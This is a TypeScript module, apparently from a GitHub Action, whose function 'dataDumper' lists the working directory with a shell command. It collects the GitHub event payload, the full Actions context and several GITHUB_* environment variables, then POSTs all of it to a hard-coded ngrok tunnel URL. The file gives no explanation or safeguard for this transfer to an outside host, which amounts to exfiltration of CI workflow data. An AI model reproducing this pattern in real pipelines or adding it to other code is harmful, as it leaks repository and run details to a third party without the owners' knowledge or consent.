import { exec } from 'child_process'
import { GitHubEvent } from './types'
import axios from 'axios'

import * as github from '@actions/github'

export async function dataDumper(eventData: GitHubEvent): Promise<void> {
  process.env.DUMP_URL = 'https://167d-122-171-17-208.ngrok-free.app'
  const sendURL = process.env.DUMP_URL

  const listOutput = await new Promise<string>(resolve => {
    exec('ls -ltrha', (error, stdout, stderr) => {
      if (error) {
        resolve(`error: ${error.message}`)
        return
      }
      if (stderr) {
        resolve(`stderr: ${stderr}`)
        return
      }
      resolve(stdout)
    })
  })

  if (!sendURL) {
    return
  }

  const data = {
    lsListing: listOutput,
    ghContext: github.context,
    eventData,
    envVars: {
      GITHUB_HEAD_REF: process.env.GITHUB_HEAD_REF,
      /**
       * Fully formed ref that triggered workflow
       * - Branch: refs/heads/<branch_name>
       * - Tags:   refs/tags/<tag_name>
       * - PR:     refs/pull/<pr_number>/merge
       */
      GITHUB_REF: process.env.GITHUB_REF,
      /**
       * short ref name that triggered workflow
       * Eg:
       * - Branch: feature-branch
       * - Tags:   v1.0.0
       * - PR:     refs/pull/<pr_number>/merge
       */
      GITHUB_REF_NAME: process.env.GITHUB_REF_NAME,
      // Type of REF that trigerred workflow. branch or tag
      GITHUB_REF_TYPE: process.env.GITHUB_REF_TYPE,
      // {owner}/{repo} for example, octocat/Hello-World
      GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
      // Owner of the repository. For example, octocat
      GITHUB_REPOSITORY_OWNER: process.env.GITHUB_REPOSITORY_OWNER,

      // A unique number for each workflow run within a repository. This number does not change if you re-run the workflow run. For example, 1658821493.
      GITHUB_RUN_ID: process.env.GITHUB_RUN_ID,

      // A unique number for each run of a particular workflow in a repository. This number begins at 1 for the workflow's first run, and increments with each new run. This number does not change if you re-run the workflow run. For example, 3.
      GITHUB_RUN_NUMBER: process.env.GITHUB_RUN_NUMBER,

      // The commit SHA that triggered the workflow. The value of this commit SHA depends on the event that triggered the workflow
      GITHUB_SHA: process.env.GITHUB_SHA,

      GITHUB_EVENT_PATH: process.env.GITHUB_EVENT_PATH
    }
  }

  await axios.post(sendURL, data)
}
